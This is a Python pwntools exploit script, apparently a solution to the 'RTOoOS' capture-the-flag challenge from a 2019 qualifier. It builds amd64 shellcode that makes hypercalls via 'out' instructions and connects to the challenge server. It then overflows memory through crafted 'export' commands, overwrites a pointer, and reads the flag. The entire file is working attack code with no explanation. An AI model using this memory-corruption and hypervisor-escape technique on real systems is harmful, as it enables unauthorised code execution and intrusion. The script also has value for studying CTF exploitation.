from pwn import *
import sys
import time

offset = 0x8c000

# hex(0x100000000 - (0x8c000 - 0x40)) -> atoi
sc1 = asm("""
mov rax, 0xfffffffffff74040
mov edi, 0x64646465
sub edi, 0x64646401
out dx, al
ret
""", arch = 'amd64', os = 'linux')
print sc1.encode('hex')

# hex(0x100000000 - (0x8c000 - 0x170)) -> strcasestr
sc2 = asm("""
mov rax, 0xfffffffffff74170
xor rsi, rsi
add si, 0x8
mov edi, 0x64646464
sub edi, 0x64646401
out dx, al
ret
""", arch = 'amd64', os = 'linux')
print sc2.encode('hex')

sc3 = asm("""
mov rax, rdi
mov edi, 0x64646467
sub edi, 0x64646401
out dx, al
ret
""", arch = 'amd64', os = 'linux')
print sc3.encode('hex')

def menu():
    p.recvuntil('> ')

p = remote('rtooos.quals2019.oooverflow.io', 5000)

for i in xrange(7):
    menu()
    if i == 1:
        p.send('export A%d=%s' % (i, 'A' * 100 + '\x87\x00'))
    else:
        p.sendline('export A%d=A' % i)

for i in xrange(8):
    menu()
    p.send('export %s=A' % ('A' * 502))

# (512 - 7 + 1 - 2 + 24) * 7 = 3696
# (512 - 7 + 1 - 502 + 24) * 8 = 224
# 4096 - (3696 + 224) = 176

# (512 - 7 + 1 - x + 24) = 176 --> x = 354
# 176 - 24 = 152
menu()
payload = 'A' * 52 + '$A1'
cmd = 'export %s=%s' % ('A' * 354, payload)
print len(cmd)
p.sendline(cmd)

menu()
p.sendline('export A0=' + sc2)

'''
menu()
p.sendline('ls')
leak = p.recvuntil('[RTOoOS>', drop=True)
leak = leak.ljust(8, '\x00')
print hex(u64(leak))
'''

menu()
p.sendline('cat a')
p.send(p64(0x7fff747eb4a7))

menu()
p.sendline('export A0=' + sc3)

menu()
p.sendline('cat flag')

p.interactive()